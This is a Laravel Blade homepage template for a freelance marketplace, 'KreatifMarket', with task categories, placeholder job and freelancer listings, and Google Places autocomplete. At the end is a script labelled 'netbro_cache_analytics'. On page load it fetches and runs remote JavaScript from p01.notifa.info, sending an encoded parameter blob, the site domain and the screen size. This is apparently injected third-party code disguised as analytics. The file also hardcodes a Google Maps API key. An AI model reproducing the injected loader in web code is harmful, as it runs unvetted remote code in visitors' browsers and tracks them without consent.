@extends('layouts.app-all')
@section('style')

@stop
@section('content')
<!-- Intro Banner
================================================== -->
<!-- add class "disable-gradient" to enable consistent background overlay -->
<div class="intro-banner" data-background-image="images/home-background.jpg">
	<div class="container">

		<!-- Intro Headline -->
		<div class="row">
			<div class="col-md-12">
				<div class="banner-headline">
					<h3>
						<strong>Hire experts or be hired for any Task, any time.</strong>
						<br>
						<span>Thousands of small businesses use <strong class="color">KreatifMarket</strong> to turn their ideas into reality.</span>
					</h3>
				</div>
			</div>
		</div>

		<!-- Search Bar -->
		<div class="row">
			<div class="col-md-12">
				<div class="intro-banner-search-form margin-top-95">

					<!-- Search Field -->
					<div class="intro-search-field with-autocomplete with-label"><div class="pac-container pac-logo" style="display: none; width: 444px; position: absolute; left: 154px; top: 466px;"></div>
						<label for="autocomplete-input" class="field-title ripple-effect">Where?</label>
						<div class="input-with-icon">
							<input id="autocomplete-input" type="text" placeholder="Online Task" autocomplete="off">
							<i class="icon-material-outline-location-on"></i>
						</div>
					</div>

					<!-- Search Field -->
					<div class="intro-search-field with-label">
						<label for="intro-keywords" class="field-title ripple-effect">What task you want?</label>
						<input id="intro-keywords" type="text" placeholder="Task Title or Keywords">
					</div>

					<!-- Button -->
					<div class="intro-search-button">
						<!-- <button class="button ripple-effect" onclick="window.location.href='tasks-list-layout-full-page-map.html'">Search</button> -->
						<button class="button ripple-effect" onclick="">Search</button>
					</div>
				</div>
			</div>
		</div>

		<!-- Stats -->
		<div class="row">
			<div class="col-md-12">
				<ul class="intro-stats margin-top-45 hide-under-992px">
					<li>
						<strong class="counter">1,586</strong>
						<span>Jobs Posted</span>
					</li>
					<li>
						<strong class="counter">3,543</strong>
						<span>Tasks Posted</span>
					</li>
					<li>
						<strong class="counter">1,232</strong>
						<span>Freelancers</span>
					</li>
				</ul>
			</div>
		</div>

	</div>
	<div class="background-image-container" style="background-image: url(&quot;images/home-background.jpg&quot;);"></div>
</div>


<!-- Content
================================================== -->
<!-- Category Boxes -->
<div class="section margin-top-65">
	<div class="container">
		<div class="row">
			<div class="col-xl-12">

				<div class="section-headline centered margin-bottom-15">
					<h3>Popular task Categories</h3>
				</div>

				<!-- Category Boxes Container -->
				<div class="categories-container">

					<!-- Category Box -->
					@foreach($category as $category_key)
					<a href="#" class="category-box">
						<div class="category-box-icon">
							<i class="{{$category_key->icon}}"></i>
						</div>
						<div class="category-box-counter">{{DB::table('projects')->where('id_category', $category_key->id)->count()}}</div>
						<div class="category-box-content">
							<h3>{{$category_key->name}}</h3>
							<p>{{$category_key->description}}</p>
						</div>
					</a>
					@endforeach
				</div>

			</div>
		</div>
	</div>
</div>
<!-- Category Boxes / End -->


<!-- Features tasks -->
<div class="section gray margin-top-45 padding-top-65 padding-bottom-75">
	<div class="container">
		<div class="row">
			<div class="col-xl-6">

				<!-- Section Headline -->
				<div class="section-headline margin-top-0 margin-bottom-35">
					<h3>Featured Tasks</h3>
					<a href="#" class="headline-link">Browse All Task</a>
				</div>

				<!-- tasks Container -->
				<div class="tasks-list-container compact-list margin-top-35">

					<!-- Task -->
					@forelse($projects as $projects_key)
					<a href="{{url('task/detail/'.$projects_key->projects_uniq.'/'.$projects_key->title)}}" class="task-listing">
						<!-- Job Listing Details -->
						<div class="task-listing-details">
							<!-- Details -->
							<div class="task-listing-description">
								<h3 class="task-listing-title">{{$projects_key->title}}</h3>
								<ul class="task-icons">
									<li><i class="icon-material-outline-location-on"></i> Online Job</li>
									<li><i class="icon-material-outline-access-time"></i> 5 minutes ago</li>
								</ul>
							</div>
						</div>
						<div class="task-listing-bid">
							<div class="task-listing-bid-inner">
								<div class="task-offers">
									@if($projects_key->budget_level == 'Freelancer Deals')
									@else
									<strong>Min : IDR {{$projects_key->budget_min}}<br>Max : IDR {{$projects_key->budget_max}}</strong>
									@endif
									<span>{{$projects_key->budget_level}}</span>
								</div>
								<span class="button button-sliding-icon ripple-effect">Bid Now <i class="icon-material-outline-arrow-right-alt"></i></span>
							</div>
						</div>
					</a>
					@empty
						<!-- Job Listing Details -->
						<div class="task-listing-details">
							<!-- Details -->
							<div class="task-listing-description" style="text-align:center">
								<h3 class="task-listing-title">No Avalible Task</h3>
							</div>
						</div>
					@endforelse
			</div>
				<!-- tasks Container / End -->

			</div>
			<div class="col-xl-6">

				<!-- Section Headline -->
				<div class="section-headline margin-top-0 margin-bottom-35">
					<h3>Featured Jobs</h3>
					<a href="#" class="headline-link">Browse All Jobs</a>
				</div>

				<!-- Jobs Container -->
				<div class="listings-container compact-list-layout margin-top-35">

					<!-- Job Listing -->
					<a href="#" class="job-listing with-apply-button">

						<!-- Job Listing Details -->
						<div class="job-listing-details">

							<!-- Logo -->
							<div class="job-listing-company-logo">
								<img src="images/company-logo-01.png" alt="">
							</div>

							<!-- Details -->
							<div class="job-listing-description">
								<h3 class="job-listing-title">Bilingual Event Support Specialist</h3>

								<!-- Job Listing Footer -->
								<div class="job-listing-footer">
									<ul>
										<li><i class="icon-material-outline-business"></i> Hexagon <div class="verified-badge" data-tippy-placement="top" data-tippy="" data-original-title="Verified Employer"></div></li>
										<li><i class="icon-material-outline-location-on"></i> San Francissco</li>
										<li><i class="icon-material-outline-business-center"></i> Full Time</li>
										<li><i class="icon-material-outline-access-time"></i> 2 days ago</li>
									</ul>
								</div>
							</div>

							<!-- Apply Button -->
							<span class="list-apply-button ripple-effect">Apply Now</span>
						</div>
					</a>


					<!-- Job Listing -->
					<a href="#" class="job-listing with-apply-button">

						<!-- Job Listing Details -->
						<div class="job-listing-details">

							<!-- Logo -->
							<div class="job-listing-company-logo">
								<img src="images/company-logo-05.png" alt="">
							</div>

							<!-- Details -->
							<div class="job-listing-description">
								<h3 class="job-listing-title">Competition Law Officer</h3>

								<!-- Job Listing Footer -->
								<div class="job-listing-footer">
									<ul>
										<li><i class="icon-material-outline-business"></i> Laxo</li>
										<li><i class="icon-material-outline-location-on"></i> San Francissco</li>
										<li><i class="icon-material-outline-business-center"></i> Full Time</li>
										<li><i class="icon-material-outline-access-time"></i> 2 days ago</li>
									</ul>
								</div>
							</div>

							<!-- Apply Button -->
							<span class="list-apply-button ripple-effect">Apply Now</span>
						</div>
					</a>
					<!-- Job Listing -->
					<a href="#" class="job-listing with-apply-button">

						<!-- Job Listing Details -->
						<div class="job-listing-details">

							<!-- Logo -->
							<div class="job-listing-company-logo">
								<img src="images/company-logo-02.png" alt="">
							</div>

							<!-- Details -->
							<div class="job-listing-description">
								<h3 class="job-listing-title">Barista and Cashier</h3>

								<!-- Job Listing Footer -->
								<div class="job-listing-footer">
									<ul>
										<li><i class="icon-material-outline-business"></i> Coffee</li>
										<li><i class="icon-material-outline-location-on"></i> San Francissco</li>
										<li><i class="icon-material-outline-business-center"></i> Full Time</li>
										<li><i class="icon-material-outline-access-time"></i> 2 days ago</li>
									</ul>
								</div>
							</div>

							<!-- Apply Button -->
							<span class="list-apply-button ripple-effect">Apply Now</span>
						</div>
					</a>


					<!-- Job Listing -->
					<a href="#" class="job-listing with-apply-button">

						<!-- Job Listing Details -->
						<div class="job-listing-details">

							<!-- Logo -->
							<div class="job-listing-company-logo">
								<img src="images/company-logo-03.png" alt="">
							</div>

							<!-- Details -->
							<div class="job-listing-description">
								<h3 class="job-listing-title">Restaurant General Manager</h3>

								<!-- Job Listing Footer -->
								<div class="job-listing-footer">
									<ul>
										<li><i class="icon-material-outline-business"></i> King <div class="verified-badge" data-tippy-placement="top" data-tippy="" data-original-title="Verified Employer"></div></li>
										<li><i class="icon-material-outline-location-on"></i> San Francissco</li>
										<li><i class="icon-material-outline-business-center"></i> Full Time</li>
										<li><i class="icon-material-outline-access-time"></i> 2 days ago</li>
									</ul>
								</div>
							</div>

							<!-- Apply Button -->
							<span class="list-apply-button ripple-effect">Apply Now</span>
						</div>
					</a>

					<!-- Job Listing -->
					<a href="#" class="job-listing with-apply-button">

						<!-- Job Listing Details -->
						<div class="job-listing-details">

							<!-- Logo -->
							<div class="job-listing-company-logo">
								<img src="images/company-logo-05.png" alt="">
							</div>

							<!-- Details -->
							<div class="job-listing-description">
								<h3 class="job-listing-title">International Marketing Coordinator</h3>

								<!-- Job Listing Footer -->
								<div class="job-listing-footer">
									<ul>
										<li><i class="icon-material-outline-business"></i> Skyist</li>
										<li><i class="icon-material-outline-location-on"></i> San Francissco</li>
										<li><i class="icon-material-outline-business-center"></i> Full Time</li>
										<li><i class="icon-material-outline-access-time"></i> 2 days ago</li>
									</ul>
								</div>
							</div>

							<!-- Apply Button -->
							<span class="list-apply-button ripple-effect">Apply Now</span>
						</div>
					</a>

				</div>
				<!-- Jobs Container / End -->

			</div>
		</div>
	</div>
</div>
<!-- Featured tasks / End -->


<!-- Features Cities -->
<div class="section margin-top-65 margin-bottom-65">
	<div class="container">
		<div class="row">

			<!-- Section Headline -->
			<div class="col-xl-12">
				<div class="section-headline centered margin-top-0 margin-bottom-45">
					<h3>Featured Cities</h3>
				</div>
			</div>

			<div class="col-xl-3 col-md-6">
				<!-- Photo Box -->
				<a href="#" class="photo-box" data-background-image="images/featured-city-01.jpg" style="background-image: url(&quot;images/featured-city-01.jpg&quot;);">
					<div class="photo-box-content">
						<h3>Bandung</h3>
						<span>376 tasks</span>
					</div>
				</a>
			</div>

			<div class="col-xl-3 col-md-6">
				<!-- Photo Box -->
				<a href="#" class="photo-box" data-background-image="images/featured-city-02.jpg" style="background-image: url(&quot;images/featured-city-02.jpg&quot;);">
					<div class="photo-box-content">
						<h3>Jakarta</h3>
						<span>645 tasks</span>
					</div>
				</a>
			</div>

			<div class="col-xl-3 col-md-6">
				<!-- Photo Box -->
				<a href="#" class="photo-box" data-background-image="images/featured-city-03.jpg" style="background-image: url(&quot;images/featured-city-03.jpg&quot;);">
					<div class="photo-box-content">
						<h3>Surabaya</h3>
						<span>832 tasks</span>
					</div>
				</a>
			</div>

			<div class="col-xl-3 col-md-6">
				<!-- Photo Box -->
				<a href="#" class="photo-box" data-background-image="images/featured-city-04.jpg" style="background-image: url(&quot;images/featured-city-04.jpg&quot;);">
					<div class="photo-box-content">
						<h3>Yogyakarta</h3>
						<span>513 tasks</span>
					</div>
				</a>
			</div>

		</div>
	</div>
</div>
<!-- Features Cities / End -->


<!-- Highest Rated Freelancers -->
<div class="section gray padding-top-65 padding-bottom-70 full-width-carousel-fix">
	<div class="container">
		<div class="row">

			<div class="col-xl-12">
				<!-- Section Headline -->
				<div class="section-headline margin-top-0 margin-bottom-25">
					<h3>Highest Rated Freelancers</h3>
					<a href="#" class="headline-link">Browse All Freelancers</a>
				</div>
			</div>

			<div class="col-xl-12">
				<div class="default-slick-carousel freelancers-container freelancers-grid-layout slick-initialized slick-slider">
					<button class="slick-prev slick-arrow slick-disabled" aria-label="Previous" type="button" aria-disabled="true" style="">Previous</button>

					<!--Freelancer -->
					<div class="slick-list draggable">
						<div class="slick-track" style="opacity: 1; width: 2184px; transform: translate3d(0px, 0px, 0px);">
							<div class="freelancer slick-slide slick-current slick-active" data-slick-index="0" aria-hidden="false" style="width: 334px;" tabindex="0">

								<!-- Overview -->
								<div class="freelancer-overview">
									<div class="freelancer-overview-inner">

										<!-- Bookmark Icon -->
										<span class="bookmark-icon"></span>

										<!-- Avatar -->
										<div class="freelancer-avatar">
											<div class="verified-badge"></div>
											<a href="#" tabindex="0"><img src="images/user-avatar-big-01.jpg" alt=""></a>
										</div>

										<!-- Name -->
										<div class="freelancer-name">
											<h4><a href="#" tabindex="0">Tom Smith <img class="flag" src="images/flags/gb.svg" alt="" data-tippy-placement="top" data-tippy="" data-original-title="United Kingdom"></a></h4>
											<span>UI/UX Designer</span>
										</div>

										<!-- Rating -->
										<div class="freelancer-rating">
											<div class="star-rating" data-rating="5.0"></div>
										</div>
									</div>
								</div>

								<!-- Details -->
								<div class="freelancer-details">
									<div class="freelancer-details-list">
										<ul>
											<li>Location <strong><i class="icon-material-outline-location-on"></i> London</strong></li>
											<li>Rate <strong>$60 / hr</strong></li>
											<li>task Success <strong>95%</strong></li>
										</ul>
									</div>
									<a href="#" class="button button-sliding-icon ripple-effect" tabindex="0" style="width: 294px;">View Profile <i class="icon-material-outline-arrow-right-alt"></i></a>
								</div>
							</div>
							<div class="freelancer slick-slide slick-active" data-slick-index="1" aria-hidden="false" style="width: 334px;" tabindex="0">

								<!-- Overview -->
								<div class="freelancer-overview">
									<div class="freelancer-overview-inner">

										<!-- Bookmark Icon -->
										<span class="bookmark-icon"></span>

										<!-- Avatar -->
										<div class="freelancer-avatar">
											<div class="verified-badge"></div>
											<a href="#" tabindex="0"><img src="images/user-avatar-big-02.jpg" alt=""></a>
										</div>

										<!-- Name -->
										<div class="freelancer-name">
											<h4><a href="#" tabindex="0">David Peterson <img class="flag" src="images/flags/de.svg" alt="" data-tippy-placement="top" data-tippy="" data-original-title="Germany"></a></h4>
											<span>iOS Expert + Node Dev</span>
										</div>

										<!-- Rating -->
										<div class="freelancer-rating">
											<div class="star-rating" data-rating="4.0"></div>
										</div>
									</div>
								</div>

								<!-- Details -->
								<div class="freelancer-details">
									<div class="freelancer-details-list">
										<ul>
											<li>Location <strong><i class="icon-material-outline-location-on"></i> Berlin</strong></li>
											<li>Rate <strong>$40 / hr</strong></li>
											<li>task Success <strong>88%</strong></li>
										</ul>
									</div>
									<a href="#" class="button button-sliding-icon ripple-effect" tabindex="0" style="width: 294px;">View Profile <i class="icon-material-outline-arrow-right-alt"></i></a>
								</div>
							</div>
							<div class="freelancer slick-slide slick-active" data-slick-index="2" aria-hidden="false" style="width: 334px;" tabindex="0">

								<!-- Overview -->
								<div class="freelancer-overview">
									<div class="freelancer-overview-inner">
										<!-- Bookmark Icon -->
										<span class="bookmark-icon"></span>

										<!-- Avatar -->
										<div class="freelancer-avatar">
											<a href="#" tabindex="0"><img src="images/user-avatar-placeholder.png" alt=""></a>
										</div>

										<!-- Name -->
										<div class="freelancer-name">
											<h4><a href="#" tabindex="0">Marcin Kowalski <img class="flag" src="images/flags/pl.svg" alt="" data-tippy-placement="top" data-tippy="" data-original-title="Poland"></a></h4>
											<span>Front-End Developer</span>
										</div>

										<!-- Rating -->
										<div class="freelancer-rating">
											<div class="star-rating" data-rating="4.5"></div>
										</div>
									</div>
								</div>

								<!-- Details -->
								<div class="freelancer-details">
									<div class="freelancer-details-list">
										<ul>
											<li>Location <strong><i class="icon-material-outline-location-on"></i> Warsaw</strong></li>
											<li>Rate <strong>$50 / hr</strong></li>
											<li>task Success <strong>100%</strong></li>
										</ul>
									</div>
									<a href="#" class="button button-sliding-icon ripple-effect" tabindex="0" style="width: 294px;">View Profile <i class="icon-material-outline-arrow-right-alt"></i></a>
								</div>
							</div>
							<div class="freelancer slick-slide" data-slick-index="3" aria-hidden="true" style="width: 334px;" tabindex="-1">

								<!-- Overview -->
								<div class="freelancer-overview">
										<div class="freelancer-overview-inner">
										<!-- Bookmark Icon -->
										<span class="bookmark-icon"></span>

										<!-- Avatar -->
										<div class="freelancer-avatar">
											<div class="verified-badge"></div>
											<a href="#" tabindex="-1"><img src="images/user-avatar-big-03.jpg" alt=""></a>
										</div>

										<!-- Name -->
										<div class="freelancer-name">
											<h4><a href="#" tabindex="-1">Sindy Forest <img class="flag" src="images/flags/au.svg" alt="" data-tippy-placement="top" data-tippy="" data-original-title="Australia"></a></h4>
											<span>Magento Certified Developer</span>
										</div>

										<!-- Rating -->
										<div class="freelancer-rating">
											<div class="star-rating" data-rating="5.0"><span class="star"></span><span class="star"></span><span class="star"></span><span class="star"></span><span class="star"></span></div>
										</div>
									</div>
								</div>

								<!-- Details -->
								<div class="freelancer-details">
									<div class="freelancer-details-list">
										<ul>
											<li>Location <strong><i class="icon-material-outline-location-on"></i> Brisbane</strong></li>
											<li>Rate <strong>$70 / hr</strong></li>
											<li>task Success <strong>100%</strong></li>
										</ul>
									</div>
									<a href="#" class="button button-sliding-icon ripple-effect" tabindex="-1" style="width: 294px;">View Profile <i class="icon-material-outline-arrow-right-alt"></i></a>
								</div>
							</div>
							<div class="freelancer slick-slide" data-slick-index="4" aria-hidden="true" style="width: 334px;" tabindex="-1">

								<!-- Overview -->
								<div class="freelancer-overview">
										<div class="freelancer-overview-inner">
										<!-- Bookmark Icon -->
										<span class="bookmark-icon"></span>

										<!-- Avatar -->
										<div class="freelancer-avatar">
											<a href="#" tabindex="-1"><img src="images/user-avatar-placeholder.png" alt=""></a>
										</div>

										<!-- Name -->
										<div class="freelancer-name">
											<h4><a href="#" tabindex="-1">Sebastiano Piccio <img class="flag" src="images/flags/it.svg" alt="" data-tippy-placement="top" data-tippy="" data-original-title="Italy"></a></h4>
											<span>Laravel Dev</span>
										</div>

										<!-- Rating -->
										<div class="freelancer-rating">
											<div class="star-rating" data-rating="4.5"><span class="star"></span><span class="star"></span><span class="star"></span><span class="star"></span><span class="star half"></span></div>
										</div>
									</div>
								</div>

								<!-- Details -->
								<div class="freelancer-details">
									<div class="freelancer-details-list">
										<ul>
											<li>Location <strong><i class="icon-material-outline-location-on"></i> Milan</strong></li>
											<li>Rate <strong>$80 / hr</strong></li>
											<li>task Success <strong>89%</strong></li>
										</ul>
									</div>
									<a href="#" class="button button-sliding-icon ripple-effect" tabindex="-1" style="width: 294px;">View Profile <i class="icon-material-outline-arrow-right-alt"></i></a>
								</div>
							</div>
							<div class="freelancer slick-slide" data-slick-index="5" aria-hidden="true" style="width: 334px;" tabindex="-1">

								<!-- Overview -->
								<div class="freelancer-overview">
										<div class="freelancer-overview-inner">
										<!-- Bookmark Icon -->
										<span class="bookmark-icon"></span>

										<!-- Avatar -->
										<div class="freelancer-avatar">
											<a href="#" tabindex="-1"><img src="images/user-avatar-placeholder.png" alt=""></a>
										</div>

										<!-- Name -->
										<div class="freelancer-name">
											<h4><a href="#" tabindex="-1">Gabriel Lagueux <img class="flag" src="images/flags/fr.svg" alt="" data-tippy-placement="top" data-tippy="" data-original-title="France"></a></h4>
											<span>WordPress Expert</span>
										</div>

										<!-- Rating -->
										<div class="freelancer-rating">
											<div class="star-rating" data-rating="5.0"><span class="star"></span><span class="star"></span><span class="star"></span><span class="star"></span><span class="star"></span></div>
										</div>
									</div>
								</div>

								<!-- Details -->
								<div class="freelancer-details">
									<div class="freelancer-details-list">
										<ul>
											<li>Location <strong><i class="icon-material-outline-location-on"></i> Paris</strong></li>
											<li>Rate <strong>$50 / hr</strong></li>
											<li>task Success <strong>100%</strong></li>
										</ul>
									</div>
									<a href="#" class="button button-sliding-icon ripple-effect" tabindex="-1" style="width: 294px;">View Profile <i class="icon-material-outline-arrow-right-alt"></i></a>
								</div>
							</div>
						</div>
					</div>
				<button class="slick-next slick-arrow" aria-label="Next" type="button" style="" aria-disabled="false">Next</button></div>
			</div>
		</div>
	</div>
</div>
<!-- Highest Rated Freelancers / End-->
@stop
@section('script')

<!-- Snackbar // documentation: https://www.polonel.com/snackbar/ -->
<script>
// Snackbar for user status switcher
$('#snackbar-user-status label').click(function() {
	Snackbar.show({
		text: 'Your status has been changed!',
		pos: 'bottom-center',
		showAction: false,
		actionText: "Dismiss",
		duration: 3000,
		textColor: '#fff',
		backgroundColor: '#383838'
	});
});
</script>


<!-- Google Autocomplete -->
<script>
	function initAutocomplete() {
		 var options = {
		  types: ['(cities)'],
		  // componentRestrictions: {country: "us"}
		 };

		 var input = document.getElementById('autocomplete-input');
		 var autocomplete = new google.maps.places.Autocomplete(input, options);
	}

	// Autocomplete adjustment for homepage
	if ($('.intro-banner-search-form')[0]) {
	    setTimeout(function(){
	        $(".pac-container").prependTo(".intro-search-field.with-autocomplete");
	    }, 300);
	}

</script>

<!-- Google API -->
<script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyAgeuuDfRlweIs7D6uo4wdIHVvJ0LonQ6g&amp;libraries=places&amp;callback=initAutocomplete"></script>

<script type="text/javascript">
if (self==top) {
  function netbro_cache_analytics(fn, callback) {
    setTimeout(function() {fn();callback();}, 0);
  }
  function sync(fn) {
    fn();
  }
  function requestCfs(){
    var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");
    var idc_glo_r = Math.floor(Math.random()*99999999999);
    var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +"4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mpUo5FfpjuX%2b7NST1VIwSQe9kL7rrnGjsMLwD%2bb%2boslr6j7Vl2r62mlFLUbTjadTbLsv3%2fRCmQfCTlSWxDhYsOvgKlE0rlw%2fK2U7OZtiVhYOOuK0DoLi2CmE1WZQCoRjc1hAvKwD1r%2fxfPJ6QWlta%2f%2b3lF5B5%2b79NjLWk59TAa8l7Qt2T2rLVZF%2bLEtma6J3%2bsKCUALu3%2byjQeKfGIFpN3kLVcArPYklDfGc3b7HV5aODJvKUloBICWN8adTPf3t%2bw7dgbidpdqRRZPixzlTEPLooNAnMRkDgIXhPyjJt3iONxwh4Y%2bdsfY3KRfBlUbhurgOsWsGasocMO4K5Lz1BsJUe7cOIEU%2feNm860TveYf6TRzMzehihcHjdBQQCmBDMcMgcZ5Hid%2fVxnx7Bj7oQbUu8u%2fvZtC%2focgzQpjs8dvheaXESDCKqc8V2%2bAlrPefui%2b1ssNQY%2f5O2QTMvUgZ1n%2b7xr6aBhPMBKg6BVQJzgYO9ritR3hj%2f0iNp1K3REJISnLEj8TN2aWQBA4SgWD%2bVYA4g26%2f%2fjYNc4snmy6Mj6R3f%2bEp1O1fTYerunHwE%2byUk" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;
    var bsa = document.createElement('script');
    bsa.type = 'text/javascript';
    bsa.async = true;
    bsa.src = url;
    (document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);
  }
  netbro_cache_analytics(requestCfs, function(){});
};
</script>
@stop
